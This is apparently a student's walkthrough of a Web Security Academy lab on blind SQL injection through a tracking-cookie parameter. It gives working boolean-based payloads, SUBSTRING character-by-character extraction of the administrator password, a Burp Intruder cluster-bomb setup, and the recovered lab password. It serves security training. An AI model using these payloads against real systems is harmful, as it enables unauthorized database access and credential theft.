## Blind SQL injection with conditional responses

1. main url : product ==> category
https://0a5d007004517ce1806a854f00a70032.web-security-academy.net/filter?category=Gifts

2. go firefox  which is connected to burp suite and and open the burp suite than go the proxy ,trun on intercept and intercept the request and select the request with tracking id and send it to repeater and then send the request to the server

trackingid = 1wfsKle6acYDzSeY;

3. now modify the request in repeater and add the following payload to the tracking id parameter to check if the query is true or false:
==> 1wfsKle6acYDzSeY' AND '1'='1;

if this query is true then the server will respond with 'welcome back!'  message and if it is false then the server will not show the 'welcome back!' message.

4. now we can use this technique to extract data from the database by using the following payloads: 

TrackingId=1wfsKle6acYDzSeY' AND(select 'a' from users where username= 'administrator')='a;

==>Verify that the condition is true, confirming that there is a user called administrator

5.  now we can use this technique to extract the length of the password of the administrator by using the following payloads:

==> TrackingId=1wfsKle6acYDzSeY' AND(select 'a' from users where username= 'administrator'and length(password)>=1)='a;

if the length of the password is greater than or equal to 1 then the server will respond with 'welcome back!'  message and if it is false then the server will not show the 'welcome back!' message.

6. now we can use this technique to extract the first character of the password of the administrator by using the following payloads:

TrackingId=1wfsKle6acYDzSeY' AND(select SUBSTRING (password,1,1) from users where username= 'administrator')='s;

if first character is 's' then the server will respond with 'welcome back!'  message and if it is false then the server will not show the 'welcome back!' message.

7. for  extracting the second character of the password of the administrator by using the following payloads:

TrackingId=1wfsKle6acYDzSeY' AND(select SUBSTRING (password,2,1) from users where username= 'administrator')='a;

if second character is 'a' then the server will respond with 'welcome back!'  message and if it is false then the server will not show the 'welcome back!' message.

8. for fast extraction of the password we can use intruder to extract the password of the administrator by using the following payloads:
 i.  select the request with tracking id and send it to intruder and then go to positions and clear the selected payloads and select the tracking id parameter and click on add button and then go to payloads and select the payload type as numbers and set the payload options as follows:

 ==> TrackingId=1wfsKle6acYDzSeY' AND(select SUBSTRING (password,$1$,1) from users where username= 'administrator')='$s$;
then set the payload options as follows: 
  -select attack typr: Cluster bomb
  - Payload position: 1-1
  - Payload type: Numbers
  - Type: Sequential
  - from: 1
  - Step: 1
  - to: 20

  - Payload position: 2-s
  - Payload type:simple list
  - Payload options: add the characters from a-z and 0-9 and special characters

after setting the payload options click on start attack and then  will get the password of the administrator in the response section.


password = ufw62mjt5uhg9o03cw0